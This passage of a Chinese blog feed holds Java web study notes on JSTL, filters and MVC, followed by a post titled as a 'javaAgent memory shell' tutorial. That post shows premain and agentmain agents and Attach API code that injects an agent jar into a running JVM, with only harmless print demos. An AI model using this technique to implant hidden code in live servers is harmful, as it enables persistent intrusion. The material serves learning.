<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.web<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--standard标签库--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page  isELIgnored=<span class="string">&quot;false&quot;</span>%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>获取数据</li>
<li>执行运算</li>
<li>获取web开发的常用对象</li>
</ul>
<p>比如获取表单中的数据${param.参数名}</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220116002754237.png" alt="image-20220116002754237"></p>
<ul>
<li><del>调用java方法</del></li>
</ul>
<h4 id="JSP标签"><a href="#JSP标签" class="headerlink" title="JSP标签"></a>JSP标签</h4><p>可以通过标签转发请求并携带参数</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--&lt;jsp:include page=<span class="string">&quot;page1.jsp&quot;</span>&gt;&lt;/jsp:include&gt;--%&gt;</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;page1.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;user&quot;</span> value=<span class="string">&quot;wuhu&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;pwd&quot;</span> value=<span class="string">&quot;***&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br></pre></td></tr></table></figure>

<h4 id="JSTL表达式"><a href="#JSTL表达式" class="headerlink" title="JSTL表达式"></a>JSTL表达式</h4><p><label style="background:yellow">JSTL标签库的使用就是为了弥补HTML标签的不足</label></p>
<p>东西太多了,边用边查就行,使用前记得导包</p>
<h5 id="核心标签-重点掌握一下"><a href="#核心标签-重点掌握一下" class="headerlink" title="核心标签(重点掌握一下)"></a>核心标签(重点掌握一下)</h5><p>要先在jsp页面中引入JSTL核心标签库</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>

<h5 id="JSTL标签库使用步骤"><a href="#JSTL标签库使用步骤" class="headerlink" title="JSTL标签库使用步骤"></a>JSTL标签库使用步骤</h5><ul>
<li>引入对应的taglib</li>
<li>使用其中的方法</li>
<li>在Tomcat  lib中也需要引入JSTL的包,否则会报JSTL解析错误(其他包的解析错误也可用同样的方法手动导入到lib目录)</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    ArrayList&lt;String&gt; students =<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    students.add(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">    students.add(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">    students.add(<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">    students.add(<span class="string">&quot;赵六&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;list&quot;</span>,students);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;student&quot;</span> items=<span class="string">&quot;$&#123;list&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;$&#123;student&#125;&quot;</span>/&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220116130300211.png" alt="image-20220116130300211"></p>
<p>在使用jstl的过程中出现了诸多问题,对于notFoundclass这一类的问题的同意解决办法就是手动导入jstl1.2和standard1.1.2包到WEB-INF目录下的lib目录和tomcat的lib目录下,切记,不能2.0的包和1.2的包混着用</p>
<p>对于使用maven阿里云镜像无法导入jstl1.2我表示真坑</p>
<h4 id="javaBean"><a href="#javaBean" class="headerlink" title="javaBean"></a>javaBean</h4><p>实体类</p>
<p>javaBean有特定的写法</p>
<ul>
<li>必须要有一个无参构造</li>
<li>属性必须私有化</li>
<li>必须有对应的get/set方法</li>
</ul>
<p>一般用来和数据库的字段做映射 ORM:</p>
<h5 id="ORM-对象关系映射"><a href="#ORM-对象关系映射" class="headerlink" title="ORM: 对象关系映射"></a>ORM: 对象关系映射</h5><ul>
<li>表—-&gt;类</li>
<li>字段—–&gt;属性</li>
<li>行记录—–&gt;对象</li>
</ul>
<h3 id="MVC三层架构"><a href="#MVC三层架构" class="headerlink" title="MVC三层架构"></a>MVC三层架构</h3><p>Model  View  Controller 模型,视图,控制器</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220116213212850.png" alt="image-20220116213212850"></p>
<p>Model</p>
<ul>
<li>业务处理:业务逻辑(service)</li>
<li>数据持久层: CRUD (Dao)</li>
</ul>
<p>View</p>
<ul>
<li>展示数据</li>
<li>提供链接发起Servlet请求</li>
</ul>
<p>Controller</p>
<ul>
<li>接收用户的请求(req:请求参数,Session信息…)</li>
<li>交给业务层处理对应的代码</li>
<li>控制视图的跳转</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录---&gt;接收用户的登录请求---&gt;处理用户的请求(获取用户登录的参数)---&gt;交给业务层处理登录业务(判断用户名密码是否正确)---&gt;Dao层查询用户名和密码是否正确</span><br></pre></td></tr></table></figure>

<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>Filter过滤器,用来过滤网站的数据:</p>
<p>web服务有一些垃圾请求,后台不应该处理,或者应该直接报错</p>
<ul>
<li>处理中文乱码</li>
<li>登录验证……</li>
</ul>
<p>Filter开发步骤</p>
<p>1.导包</p>
<p>2.编写过滤器</p>
<ul>
<li>导包别错,是servlet下面的filter</li>
<li>配置好web.xml,并且注意要过滤的路径</li>
</ul>
<p>例子</p>
<p>web.xml中配置的内容,和servlet配置很像,<code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code>表示要过滤的部分,和servlet的urlpattern相对应,属于包含关系了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--只要是经过/的请求,都会经过这个过滤器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>CharacterEncodingFilter.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharacterEncodingFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        servletRequest.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        servletResponse.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        servletResponse.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);<span class="comment">//让请求继续走,不写程序就会在这里停止</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220116223839656.png" alt="image-20220116223839656"></p>
<p>没过滤之前乱码</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220116223824121.png" alt="image-20220116223824121"></p>
<p>过滤后</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220116223932653.png" alt="image-20220116223932653"></p>
<h3 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h3><p>实现一个监听器的接口,有很多种,具体具体实现,和filter设置</p>
<p>1.编写一个监听器</p>
<ul>
<li>实现监听器接口</li>
</ul>
<p>2.web.xml中配置监听器</p>
<p>3.看情况是否使用</p>
<h3 id="过滤器应用"><a href="#过滤器应用" class="headerlink" title="过滤器应用"></a>过滤器应用</h3><p>比如是否已经登录成功的校验,这样在访问网站需要登录才能访问的资源时,会经过一次loginFilter来校验,并决定是否允许其访问,这样在每次访问对应页面时候,就不用重复写校验是否已经登录的代码了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loginFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        <span class="comment">//servletrequest拿不到session,做类型转换,转换成它爹httpservletrequest,response同理</span></span><br><span class="line">        HttpServletRequest request=(HttpServletRequest) servletRequest;</span><br><span class="line">        HttpServletResponse response=(HttpServletResponse) servletResponse;</span><br><span class="line">        <span class="keyword">if</span>(request.getSession().getAttribute(<span class="string">&quot;USER_SESSION&quot;</span>)==<span class="keyword">null</span>)&#123;</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;/error.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            filterChain.doFilter(request,response);<span class="comment">//已经登录则将请求传递下去给</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java_web</tag>
      </tags>
  </entry>
  <entry>
    <title>javaAgent内存马</title>
    <url>/2022/04/25/javaAgent%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<p>在jdk1.5以后,javaAgent是一种能够在不影响正常编译的情况下,修改字节码的技术</p>
<p>java作为一种强类型语言,不通过编译就不能够进行jar包的生成,而有了javaAgent技术,就可以在字节码这个层面对类和方法进行修改,同时,也可以把javaAgent理解成一种代码注入的方式,但是这种注入比起spring的aop更加优美</p>
<p>java agent使用方式</p>
<p>实现<code>premain</code>方法在JVM启动前加载</p>
<p>从字面上理解,就是运行在main函数之前的类,当java虚拟机启动时,在执行main函数之前,JVM会先运行javaAgent所指定jar包内Premain-Class这个类的premain方法</p>
<p>实现<code>agentmain</code>在JVM启动后加载</p>
<p>主要的接口代码在rt.jar java.lang.instrument包下面</p>
<p>实现代码在</p>
<p>JVM会优先加载带<code>Instrumentation</code>签名的方法,加载成功则忽略不带签名的,如果没有带签名的,则加载不带签名的,这个逻辑在<code>InstrumentationImpl</code>中</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220425142219666.png" alt="image-20220425142219666"></p>
<p>Instrumentation接口定义</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="keyword">boolean</span> canRetransform)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRetransformClassesSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isRedefineClassesSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getObjectSize</span><span class="params">(Object objectToSize)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isNativeMethodPrefixSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如何实现一个javaAgent</p>
<p>使用javaAgent需要几个步骤</p>
<p>1.定义一个MANIFEST.MF文件,必须包含Premain-Class选型,通常也会加入Can-Redefine-Classes和Can-Retransform-Classes选项</p>
<p>2.创建一个Premain-Class指定的类,类中包含premain方法,方法逻辑由用户自定确定</p>
<p>3.将premain的类和MANIFEST.MF文件打包成jar包</p>
<p>4.使用参数 -javaagent:jar包路径 启动要代理的方法</p>
<p>在执行以上步骤后,JVM会先执行premain方法,大部分类加载都会通过该方法,注意:是大部分,不是所有.当然,遗漏的主要是系统类,因为很多系统类先于agent执行,而用户类的加载肯东是会被拦截的.也就是说,这个方法是在main方法启动前拦截大部分类的加载活动,既然可以拦截类的加载,那么久可以去做重写类这样的操作,结合第三方的字节码编译工具,比如ASM,javassist,cglib,bytebubby等等来改写实现类</p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>实现javaagent需要搭建两个工程,一个工程师用来承载javaagent类,单独的打成jar包;</p>
<p>一个工程师javaagent需要去代理的类,即javaagent会在这个工程中的main方法启动之前去做一些事情</p>
<h4 id="premain简单实现"><a href="#premain简单实现" class="headerlink" title="premain简单实现"></a>premain简单实现</h4><p>1.新建项目</p>
<p>项目结构如图</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426090315058.png" alt="image-20220426090315058"></p>
<p>没有建立包的原因是为了后面命令行执行的时候方便操作</p>
<p>mainTest文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main方法执行!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>AgentTest文件(内部实现premain方法)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;premain agent!!!!&quot;</span>);</span><br><span class="line">        System.out.println(args);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="keyword">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="keyword">true</span></span><br><span class="line">Premain-Class: AgentTest</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将项目以Artifacts模式打包为jar包,(其实主要打包的是premain的类)</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426090634611.png" alt="image-20220426090634611"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426092321902.png" alt="image-20220426092321902"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426092334442.png" alt="image-20220426092334442"></p>
<p>打包为jar包在out目录下</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426092359077.png" alt="image-20220426092359077"></p>
<p>这个时候不写包名的作用就体现出来了,将刚才打包的jar和javaagent作为参数去运行MainTest</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:E:\java\rubbish\test1\out\artifacts\test1_jar\test1.jar MainTest</span><br></pre></td></tr></table></figure>

<p>虽然成功执行了,但是乱码了,很烦</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426093144597.png" alt="image-20220426093144597"></p>
<p>premain的这种方式需要在启动时用<code>-javaagent</code>参数绑定,存在一定的局限性,在实际环境中,目标的JVM通常是已经启动的状态,无法预先加载premain,相比之下,agentmain更加实用</p>
<h3 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h3><p>不知道为什么,tools.jar是添加到环境变量中的,但是<code>com.sun.tools.attach</code>还是报红</p>
<p>直接导入外部依赖将tools.jar的真实路径填写,就不报红了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>D:\environment\jdks\jdk1.8.0_65\lib\tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>写一个<code>agentmain</code>和<code>premain</code>差不多,只需要在<code>META-INF/MANIFEST.MF</code>中加入<code>Agent-Class:</code>即可</p>
<p>不同的是,这种方法不是通过JVM启动前的参数来指定的,官方为了实现启动后加载,提供了<code>Attach API</code>,<code>Attach API</code>很简单,只有2个主要的类,都在<code>com.sun.tools.attach</code>包里面</p>
<p>主要关注抽象类<code>VirtualMachine</code></p>
<p>字面意思就是虚拟机,也就是程序需要监控的目标虚拟机,提供了获取系统信息,它里面提供了获取系统信息、 <code>loadAgent</code>，<code>Attach</code> 和 <code>Detach</code> 等方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得当前所有的JVM列表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;VirtualMachineDescriptor&gt; <span class="title">list</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pid连接到JVM</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> VirtualMachine <span class="title">attach</span><span class="params">(String id)</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开连接</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">detach</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent，agentmain方法靠的就是这个方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadAgent</span><span class="params">(String agent)</span> </span>&#123; ... &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其中list()返回的是一个<code>VirtualMachineDescriptor</code>列表,<code>VirtualMachineDescriptor</code>类其中的成员有下面几个,id应该是jvm对应的pid</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426115600828.png" alt="image-20220426115600828"></p>
<p>所以在使用attach方法前先使用list获取到id</p>
<p>所以大体操作方法还是和premain的差不多,还是通过artifacts-&gt;build打包成jar</p>
<p>项目结构一样</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426122014335.png" alt="image-20220426122014335"></p>
<p>首先把agent打包成jar</p>
<p>写一个有agentmain方法的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello I`m agentMain!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在MF文件中加入Agent-Class即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: AgentMainTest</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后面的步骤就比premain的时候简单多了,只需要连接虚拟机,提供代理jar包路径即可运行其中的<code>agantmain</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//E:\java\rubbish\agent\out\artifacts\agent_jar\agent.jar</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptors = VirtualMachine.list();</span><br><span class="line">        String id=virtualMachineDescriptors.get(<span class="number">1</span>).id();</span><br><span class="line">        <span class="comment">//连接虚拟机</span></span><br><span class="line">        VirtualMachine vm=VirtualMachine.attach(id);</span><br><span class="line">        <span class="comment">//提供代理jar包路径</span></span><br><span class="line">        vm.loadAgent(<span class="string">&quot;E:\\java\\rubbish\\agent\\out\\artifacts\\agent_jar\\agent.jar&quot;</span>);</span><br><span class="line">        vm.detach();</span><br><span class="line">        System.out.println(<span class="string">&quot;ends-------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里有个问题,就是jvm的id需要小猜一下</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426164713688.png" alt="image-20220426164713688"></p>
<h3 id="instrumentation"><a href="#instrumentation" class="headerlink" title="instrumentation"></a>instrumentation</h3><p><code>instrumentation</code>是<code>JVMTIAgent</code> (JVM Tool Interface Agent)的一部分,Java agent通过这个类和目标JVM进行交互,从而达到修改数据的效果</p>
